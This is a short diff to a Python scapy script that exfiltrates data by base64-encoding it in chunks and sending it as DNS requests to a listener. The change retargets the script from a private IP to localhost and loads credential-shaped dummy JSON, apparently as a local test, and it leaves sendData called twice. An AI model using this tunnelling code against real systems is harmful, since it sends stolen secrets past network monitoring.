@@ -7,11 +7,11 @@
 from scapy.all import *
 from base64 import b64encode 
 
-ip = "10.178.77.149"
+ip = "127.0.0.1"
 port = 13337
 domain = "google.com"
-chunkLength = 3
-data = "Winter is coming"
+chunkLength = 24
+data = '{"user": "admin", "password": "SuperSecretPass123!", "api_key": "sk-9876543210abcdef", "db_host": "10.0.0.5"}'
 
 def process(response):
     if response.haslayer(DNS) and response[DNS].ancount > 0:
@@ -42,6 +42,10 @@ def sendData(data):
         encoded = b64encode(bytes(chunk, "utf-8"))
         encoded = encoded.decode("utf-8").strip("=")
         DNSRequest(encoded)
+    print("Sending end marker (R)")
+    DNSRequest("R")
+
+sendData(data)
 
 
 sendData(data)
